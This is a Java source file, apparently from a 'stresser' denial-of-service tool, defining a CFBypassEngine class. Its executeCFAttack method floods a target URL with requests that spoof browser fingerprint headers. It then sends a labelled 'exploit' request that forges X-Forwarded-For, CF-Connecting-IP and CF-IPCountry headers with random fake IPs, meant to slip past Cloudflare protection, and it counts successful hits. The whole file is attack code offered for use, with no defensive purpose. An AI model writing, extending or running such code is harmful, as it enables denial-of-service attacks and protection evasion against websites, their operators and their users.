package com.stresser.engine;

import com.stresser.model.AttackStats;
import okhttp3.*;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class CFBypassEngine {
    
    private final OkHttpClient client;
    private final Random random = new Random();
    
    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    };
    
    public CFBypassEngine() {
        this.client = new OkHttpClient.Builder()
                .followRedirects(true)
                .followSslRedirects(true)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .cookieJar(new CookieJar() {
                    private final java.util.HashMap<String, java.util.List<Cookie>> cookieStore = new java.util.HashMap<>();
                    
                    @Override
                    public void saveFromResponse(HttpUrl url, java.util.List<Cookie> cookies) {
                        cookieStore.put(url.host(), cookies);
                    }
                    
                    @Override
                    public java.util.List<Cookie> loadForRequest(HttpUrl url) {
                        java.util.List<Cookie> cookies = cookieStore.get(url.host());
                        return cookies != null ? cookies : new java.util.ArrayList<>();
                    }
                })
                .build();
    }
    
    public void executeCFAttack(String target, AttackStats stats) {
        try {
            // Phase 1: Initial request
            Request req1 = new Request.Builder()
                    .url(target)
                    .addHeader("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)])
                    .addHeader("sec-ch-ua", "\"Chromium\";v=\"120\"")
                    .addHeader("sec-ch-ua-mobile", "?0")
                    .addHeader("sec-ch-ua-platform", "\"Windows\"")
                    .addHeader("Sec-Fetch-Dest", "document")
                    .addHeader("Sec-Fetch-Mode", "navigate")
                    .build();
            
            try (Response resp1 = client.newCall(req1).execute()) {
                stats.incrementTotal();
                if (resp1.isSuccessful()) {
                    stats.incrementSuccess();
                }
            }
            
            // Phase 2: Exploit
            Thread.sleep(random.nextInt(1000) + 500);
            
            String fakeIP = generateFakeIP();
            Request req2 = new Request.Builder()
                    .url(target)
                    .addHeader("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)])
                    .addHeader("X-Forwarded-For", fakeIP)
                    .addHeader("CF-Connecting-IP", fakeIP)
                    .addHeader("CF-IPCountry", "US")
                    .build();
            
            try (Response resp2 = client.newCall(req2).execute()) {
                stats.incrementTotal();
                if (resp2.isSuccessful()) {
                    stats.incrementSuccess();
                }
            }
            
        } catch (Exception e) {
            stats.incrementTotal();
            stats.incrementFailed();
        }
    }
    
    private String generateFakeIP() {
        return random.nextInt(256) + "." + 
               random.nextInt(256) + "." + 
               random.nextInt(256) + "." + 
               random.nextInt(256);
    }
}
